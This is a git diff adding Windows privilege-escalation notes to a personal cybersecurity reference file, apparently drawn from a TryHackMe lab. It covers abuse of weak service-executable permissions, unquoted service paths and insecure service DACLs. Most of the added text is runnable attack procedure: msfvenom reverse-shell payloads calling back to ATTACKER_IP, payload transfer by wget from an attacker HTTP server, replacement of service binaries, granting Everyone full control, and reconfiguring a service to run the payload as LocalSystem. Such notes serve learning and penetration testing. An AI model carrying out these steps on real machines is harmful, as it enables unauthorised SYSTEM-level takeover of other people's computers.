@@ -50,6 +50,7 @@ Collection of notes regarding Cybersecurity vocabulary for my personal reference
 + [Privilege Escalation](#privilege-escalation)
     + [Shell Tools](#shell-tools)
     + [Linux Privilege Escalation](#linux-privilege-escalation)
+    + [Windows Privilege Escalation](#windows-privilege-escalation)
 ### Offensive Security Tools
 + [Metasploit](#metasploit)
 + [Burp Suite](#burp-suite)
@@ -3871,3 +3872,87 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL
 # Run installer to receive reverse shell
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
+
+### Abusing Service Miscofigurations
++ Insecure Permissions on Service Executable - if associated executable has weak permissions, the attacker can modify or replace it
+```
+# E.g. Abusing WindowsScheduler service
+# Query service configuration
+sc qc WindowsScheduler
+
+# Check perimssions on the executable
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+
+# If user has modify permissions, overwrite executable with payload 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+python3 -m http.server
+
+# Transfer payload to target system
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+
+# Replace executable with payload
+cd C:\PROGRA~2\SYSTEM~1\
+
+move WService.exe WService.exe.bkp
+
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+
+# Grant full permissions
+icacls WService.exe /grant Everyone:F
+```
+What is left now is to set-up a listener and restart the service
+```
+# Stop service
+sc stop windowsscheduler
+
+# Start service
+sc start windowsscheduler
+```
+A reverse shell will be generated with the concerned user's privileges.
+
++ Unquoted Service Paths - when a path to the executable is not quoted (i.e. no " "), attackers can force the service to run an arbitrary executable; Note: this usually happens when service executables are not installed in *C:\Program Files* or *C:\Program Files (x86)*, which are unwriteable by unprivileged users
+```
+# E.g. Checking C:/MyPrograms
+# Check permissions in C:/MyPrograms
+icacls c:\MyPrograms
+
+# Generate payload with msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+
+# Move payload to target location
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+
+# Grant full permissions
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+```
+Then start and restart the service.
+```
+# Stop service 
+sc stop "disk sorter enterprise"
+
+# Start service
+sc start "disk sorter enterprise"
+```
+A reverse shell will be generated with the concerned user's privileges.
+
++ Insecure Service Permissions - if the service Discretionary Access List (DACL) allows modification of configurations of a service, an attacker can point to any executable
+```
+# E.g. Checking DACL for 'thmservice'
+# Use accesschk to check service DACL
+accesschk64.exe -qlc thmservice
+```
+Note: the command above uses the tool [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite
+```
+# Generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+
+# Transfer payload to target machine
+
+# Grant full permissions
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+
+# Change service's associated executable and accound
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+Restart the service, and a reverse shell with SYSTEM privileges will be generated.
